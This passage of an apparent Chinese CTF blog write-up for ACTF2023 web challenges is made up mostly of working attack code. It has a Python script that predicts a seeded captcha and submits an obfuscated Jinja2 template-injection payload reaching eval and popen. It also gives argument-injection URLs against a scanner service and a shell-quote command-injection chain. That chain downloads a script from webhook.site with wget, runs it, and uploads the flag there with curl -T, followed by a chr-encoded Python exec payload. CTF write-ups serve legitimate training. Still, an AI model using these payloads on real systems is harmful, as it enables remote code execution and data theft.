[&#x27;\\x&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;.&#x27;,&#x27;getitem&#x27;,&#x27;print&#x27;,&#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;getattribute&#x27;,&#x27;config&#x27;],                   # rule 1</span><br><span class="line">    [&#x27;(&#x27;,&#x27;]&#x27;,&#x27;getitem&#x27;,&#x27;_&#x27;,&#x27;%&#x27;,&#x27;print&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\&#x27;&#x27;,&#x27;\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;join&#x27;,&#x27;.&#x27;,&#x27;set&#x27;],              # rule 2</span><br><span class="line">    [&#x27;\&#x27;&#x27;,&#x27;\&quot;&#x27;,&#x27;dict&#x27;,&#x27;,&#x27;,&#x27;config&#x27;,&#x27;join&#x27;,&#x27;\\x&#x27;,&#x27;)&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;attr&#x27;,&#x27;__&#x27;,&#x27;list&#x27;,&#x27;globals&#x27;,&#x27;.&#x27;],                           # rule 3</span><br><span class="line">    [&#x27;[&#x27;,&#x27;)&#x27;,&#x27;getitem&#x27;,&#x27;request&#x27;,&#x27;.&#x27;,&#x27;|&#x27;,&#x27;config&#x27;,&#x27;popen&#x27;,&#x27;dict&#x27;,&#x27;doc&#x27;,&#x27;\\x&#x27;,&#x27;_&#x27;,&#x27;\&#123;\&#123;&#x27;,&#x27;mro&#x27;],                          # rule 4</span><br><span class="line">    [&#x27;\\x&#x27;,&#x27;(&#x27;,&#x27;)&#x27;,&#x27;config&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;\&#123;\&#123;&#x27;,&#x27;.&#x27;,&#x27;request&#x27;,&#x27;|&#x27;,&#x27;attr&#x27;],                          # rule 5</span><br><span class="line">    [&#x27;print&#x27;, &#x27;class&#x27;, &#x27;import&#x27;, &#x27;eval&#x27;, &#x27;__&#x27;, &#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;|&#x27;,&#x27;\\x&#x27;,&#x27;getitem&#x27;]                  # rule 6</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># Make waf more random</span><br><span class="line">def transfrom(number):</span><br><span class="line">    a = random.randint(0,20)</span><br><span class="line">    b = random.randint(0,100)</span><br><span class="line">    return (a * number + b) % 6</span><br><span class="line"></span><br><span class="line">def singel_waf(input, rules):</span><br><span class="line">    input = input.lower()</span><br><span class="line">    for rule in rules:</span><br><span class="line">        if rule in input:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def minic_waf(input):</span><br><span class="line">    waf_seq = random.sample(range(21),3)</span><br><span class="line">    result_2 = None</span><br><span class="line">    result_1 = None</span><br><span class="line">    result_3 = None</span><br><span class="line">    for index in range(len(waf_seq)):</span><br><span class="line">        waf_seq[index] = transfrom(waf_seq[index])</span><br><span class="line">        if index == 0:</span><br><span class="line">            result_1 = rule[waf_seq[index]]</span><br><span class="line">        elif index == 1:</span><br><span class="line">            result_2 = rule[waf_seq[index]]</span><br><span class="line">        else:</span><br><span class="line">            result_3 = rule[waf_seq[index]]</span><br><span class="line">        if(result_1==result_2 ==result_3==[&#x27;\\x&#x27;,&#x27;[&#x27;,&#x27;]&#x27;,&#x27;.&#x27;,&#x27;getitem&#x27;,&#x27;print&#x27;,&#x27;request&#x27;,&#x27;args&#x27;,&#x27;cookies&#x27;,&#x27;values&#x27;,&#x27;getattribute&#x27;,&#x27;config&#x27;]):</span><br><span class="line">            print(result_3)</span><br><span class="line">            return &#x27;1&#x27;</span><br><span class="line">        if not singel_waf(input, rule[waf_seq[index]]):</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br></pre></td></tr></table></figure>
+<p>最终payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">import random</span><br><span class="line">from utils.captcha import Captcha</span><br><span class="line">from utils.testminic import *</span><br><span class="line"></span><br><span class="line">def generate_code(length: int = 4,z=0):</span><br><span class="line">    characters = &#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span><br><span class="line">    return &#x27;&#x27;.join(random.choice(characters) for _ in range(length))</span><br><span class="line"></span><br><span class="line">url = &#x27;http://124.70.33.170:23001/&#x27;</span><br><span class="line">url = &#x27;http://127.0.0.1:5000/&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    now = int(time.time())</span><br><span class="line">    session = requests.session()</span><br><span class="line">    all = 0</span><br><span class="line">    payload = &#x27;123&#x27;</span><br><span class="line">    res = session.get(url+&#x27;captcha&#x27;)</span><br><span class="line">    for i in range(1,100):</span><br><span class="line">        gen = Captcha(200, 80,now+i)</span><br><span class="line">        buf , captcha_text = gen.generate()</span><br><span class="line">        if(buf.getvalue()==res.content):</span><br><span class="line">            print(now+i)</span><br><span class="line">            seed = now+i</span><br><span class="line">            print(&#x27;success&#x27;)</span><br><span class="line">            gen = Captcha(200, 80,seed)</span><br><span class="line">            buf , captcha_text = gen.generate()</span><br><span class="line">            code = generate_code()</span><br><span class="line">            minic_waf(payload)</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">            x = 0</span><br><span class="line">            while True:</span><br><span class="line">                x+=1</span><br><span class="line">                if minic_waf(payload) == &#x27;1&#x27;:</span><br><span class="line">                    print(x)</span><br><span class="line">                    break</span><br><span class="line">            if(x&gt;10):</span><br><span class="line">                print(&quot;more than 10&quot;)</span><br><span class="line">                time.sleep(1)</span><br><span class="line">                break</span><br><span class="line">            print(&quot;x_all:&quot;+str(x))</span><br><span class="line">            res = session.post(url+&#x27;vip&#x27;,json=&#123;&quot;captcha&quot;:code&#125;)</span><br><span class="line">            print(res.cookies)</span><br><span class="line">            print(&quot;a&quot;)</span><br><span class="line">            res = session.post(url+&#x27;write&#x27;,json=&#123;&quot;story&quot;:payload&#125;)</span><br><span class="line">            print(res.text)</span><br><span class="line">            error = []</span><br><span class="line">            for i in range(x-1):</span><br><span class="line">                res = session.post(url+&#x27;write&#x27;,json=&#123;&quot;story&quot;:payload&#125;)</span><br><span class="line"></span><br><span class="line">                print(i)</span><br><span class="line">            payload = &#x27;&#123;% set zero = (self|int) %&#125;&#123;% set one = (zero**zero)|int %&#125;&#123;% set two = (zero-one-one)|abs %&#125;&#123;% set four = (two*two)|int %&#125;&#123;% set five = (two*two*two)-one-one-one %&#125;&#123;% set three = five-one-one %&#125;&#123;% set nine = (two*two*two*two-five-one-one) %&#125;&#123;% set seven = (zero-one-one-five)|abs %&#125;&#123;% set space = self|string|min %&#125;&#123;% set point = self|float|string|min %&#125;&#123;% set c = dict(c=aa)|reverse|first %&#125;&#123;% set bfh = self|string|urlencode|first %&#125;&#123;% set bfhc = bfh~c %&#125;&#123;% set slas = bfhc%((four~seven)|int) %&#125;&#123;% set yin = bfhc%((three~nine)|int) %&#125;&#123;% set xhx = bfhc%((nine~five)|int) %&#125;&#123;% set right = bfhc%((four~one)|int) %&#125;&#123;% set left = bfhc%((four~zero)|int) %&#125;&#123;% set but = dict(buil=aa,tins=dd)|join %&#125;&#123;% set imp = dict(imp=aa,ort=dd)|join %&#125;&#123;% set pon = dict(po=aa,pen=dd)|join %&#125;&#123;% set so = dict(o=aa,s=dd)|join %&#125;&#123;% set ca = dict(ca=aa,t=dd)|join %&#125;&#123;% set flg = dict(fl=aa,ag=dd)|join %&#125;&#123;% set ev = dict(ev=aa,al=dd)|join %&#125;&#123;% set red = dict(re=aa,ad=dd)|join %&#125;&#123;% set bul = xhx~xhx~but~xhx~xhx %&#125;&#123;% set ini = dict(ini=aa,t=bb)|join %&#125;&#123;% set glo = dict(glo=aa,bals=bb)|join %&#125;&#123;% set itm = dict(ite=aa,ms=bb)|join %&#125;&#123;% set pld = xhx~xhx~imp~xhx~xhx~left~yin~so~yin~right~point~pon~left~yin~ca~space~flg~yin~right~point~red~left~right %&#125;&#123;% for f,v in (self|attr(xhx~xhx~ini~xhx~xhx)|attr(xhx~xhx~glo~xhx~xhx)|attr(itm))() %&#125;&#123;% if f == bul %&#125;&#123;% for a,b in (v|attr(itm))() %&#125;&#123;% if a == ev %&#125;&#123;&#123;b(pld)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#x27;</span><br><span class="line">            </span><br><span class="line">            res = session.post(url+&#x27;write&#x27;,json=&#123;&quot;story&quot;:payload&#125;)</span><br><span class="line">            print(res.text)</span><br><span class="line">            res = session.get(url+&#x27;story&#x27;)</span><br><span class="line">            print(&quot;result:&quot;)</span><br><span class="line">            print(res.text)</span><br><span class="line">            </span><br><span class="line">            if(&#x27;ACTF&#x27; in res.text):</span><br><span class="line">                exit(0)</span><br><span class="line">            </span><br></pre></td></tr></table></figure>
+<h2 id="MyGO’s-Live"><a href="#MyGO’s-Live" class="headerlink" title="MyGO’s Live!!!!!"></a>MyGO’s Live!!!!!</h2><p>这题其实是参考sekaictf的一道题 </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web/scanner-service/solution">https://github.com/project-sekai-ctf/sekaictf-2023/tree/main/web/scanner-service/solution</a></p>
+<p>非预期就是靶机有问题  别人解出的flag直接就是会在日志里  然后大家都能看到了</p>
+<p>预期解</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">正解</span><br><span class="line">http://192.168.247.18:3333/checker?url=-i%09/flag-????????????????</span><br><span class="line">http://192.168.247.18:3333/checker?url=-i%09/plzfailme</span><br><span class="line"></span><br><span class="line">另一种解法：</span><br><span class="line">http://192.168.247.18:3333/checker?url=-i%09/flag-????????????????%09-oN%09public/114.html</span><br><span class="line">http://192.168.247.18:3333/114.html</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231101105029814.png" alt="image-20231101105029814"></p>
+<h2 id="Ave-Mujica’s-Masquerade"><a href="#Ave-Mujica’s-Masquerade" class="headerlink" title="~Ave Mujica’s Masquerade~"></a>~Ave Mujica’s Masquerade~</h2><p>这题的话是上面那题的升级版</p>
+<p>只不过是另一个考点</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231101105439024.png" alt="image-20231101105439024"></p>
+<p>其实重点就是绕过他  <img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20231101105542128.png" alt="image-20231101105542128"></p>
+<p>是存在一个洞的这个版本</p>
+<p><a target="_blank" rel="noopener" href="https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html">https://wh0.github.io/2021/10/28/shell-quote-rce-exploiting.html</a>  这篇文章看懂就出</p>
+<p>payload1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.sh</span><br><span class="line">#!/bin/sh</span><br><span class="line">curl -T /flag-???????????????? http://webhook.site/&lt;id&gt;/</span><br><span class="line"></span><br><span class="line">网站执行</span><br><span class="line">http://&lt;url&gt;/checker?url=127.0.0.1:`:`wget$IFS\webhook.site/&lt;id&gt;/$IFS\-O$IFS/tmp/s.sh``:`</span><br><span class="line">http:/&lt;url/checker?url=127.0.0.1:`:`sh$IFS\/tmp/s.sh``:`</span><br></pre></td></tr></table></figure>
+<p>payload2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">http://124.70.33.170:24001/checker?url=:`%3a`mkdir$IFS$1public``%3a%23</span><br><span class="line">http://124.70.33.170:24001/checker?url=:`%3a`find$IFS$1/$IFS$1-name$IFS$1flag-*$IFS$1-exec$IFS$1cp$IFS$1&#123;&#125;$IFS$1./public/6.png$IFS$1\;``%3a%23</span><br><span class="line">http://124.70.33.170:24001/6.png</span><br></pre></td></tr></table></figure>
+<p>payload3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://124.70.33.170:24001/checker?url=1:`:`sleep$IFS\9``:` </span><br><span class="line"></span><br><span class="line">exp</span><br><span class="line">http://124.70.33.170:24001/checker?url=0%00%3A%60%3A%60python3%24IFS%5C-c%24IFS%5Cexec%28chr%28105%29%2Bchr%28109%29%2Bchr%28112%29%2Bchr%28111%29%2Bchr%28114%29%2Bchr%28116%29%2Bchr%2832%29%2Bchr%28103%29%2Bchr%28108%29%2Bchr%28111%29%2Bchr%2898%29%2Bchr%2859%29%2Bchr%2810%29%2Bchr%28102%29%2Bchr%28108%29%2Bchr%2897%29%2Bchr%28103%29%2Bchr%2895%29%2Bchr%28110%29%2Bchr%2897%29%2Bchr%28109%29%2Bchr%28101%29%2Bchr%2861%29%2Bchr%28103%29%2Bchr%28108%29%2Bchr%28111%29%2Bchr%2898%29%2Bchr%2846%29%2Bchr%28103%29%2Bchr%28108%29%2Bchr%28111%29%2Bchr%2898%29%2Bchr%2840%29%2Bchr%2839%29%2Bchr%2847%29%2Bchr%28102%29%2Bchr%28108%29%2Bchr%2897%29%2Bchr%28103%29%2Bchr%2842%29%2Bchr%2839%29%2Bchr%2841%29%2Bchr%2891%29%2Bchr%2848%29%2Bchr%2893%29%2Bchr%2810%29%2Bchr%28102%29%2Bchr%28100%29%2Bchr%2849%29%2Bchr%2861%29%2Bchr%28111%29%2Bchr%28112%29%2Bchr%28101%29%2Bchr%28110%29%2Bchr%2840%29%2Bchr%28102%29%2Bchr%28108%29%2Bchr%2897%29%2Bchr%28103%29%2Bchr%2895%29%2Bchr%28110%29%2Bchr%2897%29%2Bchr%28109%29%2Bchr%28101%29%2Bchr%2841%29%2Bchr%2859%29%2Bchr%2810%29%2Bchr%28102%29%2Bchr%28100%29%2Bchr%2850%29%2Bchr%2861%29%2Bchr%28111%29%2Bchr%28112%29%2Bchr%28101%29%2Bchr%28110%29%2Bchr%2840%29%2Bchr%2834%29%2Bchr%28112%29%2Bchr%28117%29%2Bchr%2898%29%2Bchr%28108%29%2Bchr%28105%29%2Bchr%2899%29%2Bchr%2847%29%2Bchr%2849%29%2Bchr%2849%29%2Bchr%2852%29%2Bchr%2846%29%2Bchr%28104%29%2Bchr%28116%29%2Bchr%28109%29%2Bchr%28108%29%2Bchr%2834%29%2Bchr%2844%29%2Bchr%2834%29%2Bchr%28119%29%2Bchr%2834%29%2Bchr%2841%29%2Bchr%2859%29%2Bchr%2810%29%2Bchr%28102%29%2Bchr%28100%29%2Bchr%2850%29%2Bchr%2846%29%2Bchr%28119%29%2Bchr%28114%29%2Bchr%28105%29%2Bchr%28116%29%2Bchr%28101%29%2Bchr%2840%29%2Bchr%28102%29%2Bchr%28100%29%2Bchr%2849%29%2Bchr%2846%29%2Bchr%28114%29%2Bchr%28101%29%2Bchr%2897%29%2Bchr%28100%29%2Bchr%2840%29%2Bchr%2841%29%2Bchr%2841%29%2Bchr%2859%29%29%60%60%3A%60</span><br><span class="line">http://124.70.33.170:24001/114.html</span><br><span class="line"></span><br><span class="line">//这里是用chr来绕过</span><br><span class="line">ACTF&#123;Th3_only_1_I_c4n_tRUST_is_mySeLf&#125;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://ml-hacker.github.io/2023/10/31/ACTF/">https://ml-hacker.github.io/2023/10/31/ACTF/</a> </p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://ke1nys.github.io">ke1nys</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ke1nys.github.io/posts/c2eb5b43.html">https://ke1nys.github.io/posts/c2eb5b43.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ke1nys.github.io" target="_blank">ke1nys`Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/c08e5485.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">VulnStack7</div></div></a></div><div class="next-post pull-right"><a href="/posts/7fa7855c.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">春秋云镜-网鼎半决赛</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/c253e927.html" title="2023-香山杯-Web"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-17</div><div class="title">2023-香山杯-Web</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/qq.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ke1nys</div><div class="author-info__description">生命不息,折腾不止</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">152</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">123</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ke1nys/ke1nys.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客一起学习嗷~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#craftcms"><span class="toc-number">1.</span> <span class="toc-text">craftcms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-latex"><span class="toc-number">2.</span> <span class="toc-text">easy latex</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hook"><span class="toc-number">3.</span> <span class="toc-text">hook</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Story"><span class="toc-number">4.</span> <span class="toc-text">Story</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MyGO%E2%80%99s-Live"><span class="toc-number">5.</span> <span class="toc-text">MyGO’s Live!!!!!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ave-Mujica%E2%80%99s-Masquerade"><span class="toc-number">6.</span> <span class="toc-text">~Ave Mujica’s Masquerade~</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/cd01b188.html" title="HTB-Authority"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Authority"/></a><div class="content"><a class="title" href="/posts/cd01b188.html" title="HTB-Authority">HTB-Authority</a><time datetime="2023-11-07T12:56:34.000Z" title="发表于 2023-11-07 20:56:34">2023-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/8d11f029.html" title="HTB-Manager"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HTB-Manager"/></a><div class="content"><a class="title" href="/posts/8d11f029.html" title="HTB-Manager">HTB-Manager</a><time datetime="2023-11-06T11:04:30.000Z" title="发表于 2023-11-06 19:04:30">2023-11-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/c08e5485.html" title="VulnStack7"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="VulnStack7"/></a><div class="content"><a class="title" href="/posts/c08e5485.html" title="VulnStack7">VulnStack7</a><time datetime="2023-11-03T03:25:26.000Z" title="发表于 2023-11-03 11:25:26">2023-11-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/c2eb5b43.html" title="ACTF2023-Web"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ACTF2023-Web"/></a><div class="content"><a class="title" href="/posts/c2eb5b43.html" title="ACTF2023-Web">ACTF2023-Web</a><time datetime="2023-10-31T01:37:37.000Z" title="发表于 2023-10-31 09:37:37">2023-10-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/7fa7855c.html" title="春秋云镜-网鼎半决赛"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="春秋云镜-网鼎半决赛"/></a><div class="content"><a class="title" href="/posts/7fa7855c.html" title="春秋云镜-网鼎半决赛">春秋云镜-网鼎半决赛</a><time datetime="2023-10-27T01:31:14.000Z" title="发表于 2023-10-27 09:31:14">2023-10-27</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By ke1nys</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div class="app-refresh" id="app-refresh" style="position: fixed;top: -2.2rem;left: 0;right: 0;z-index: 99999;padding: 0 1rem;font-size: 15px;height: 2.2rem;transition: all 0.3s ease;"><div class="app-refresh-wrap" style=" display: flex;color: #fff;height: 100%;align-items: center;justify-content: center;"><label>✨ 有新文章啦！ 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color: #fff;text-decoration: underline;cursor: pointer;">🍗点击食用🍔</span></a></div></div><script>if ('serviceWorker' in navigator) {
+if (navigator.serviceWorker.controller) {
+navigator.serviceWorker.addEventListener('controllerchange', function() {
+showNotification()
+})
+}
+window.addEventListener('load', function() {
+navigator.serviceWorker.register('/sw.js')
+})
+}
+function showNotification() {
+if (GLOBAL_CONFIG.Snackbar) {
+var snackbarBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+GLOBAL_CONFIG.Snackbar.bgLight :
+GLOBAL_CONFIG.Snackbar.bgDark
+var snackbarPos = GLOBAL_CONFIG.Snackbar.position
+Snackbar.show({
+text: '✨ 有新文章啦！ 👉',
+backgroundColor: snackbarBg,
+duration: 500000,
+pos: snackbarPos,
+actionText: '🍗点击食用🍔',
+actionTextColor: '#fff',
+onActionClick: function(e) {
+location.reload()
+},
+})
+} else {
+var showBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+'#3b70fc' :
+'#1f1f1f'
+var cssText = `top: 0; background: ${showBg};`
+document.getElementById('app-refresh').style.cssText = cssText
+}
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
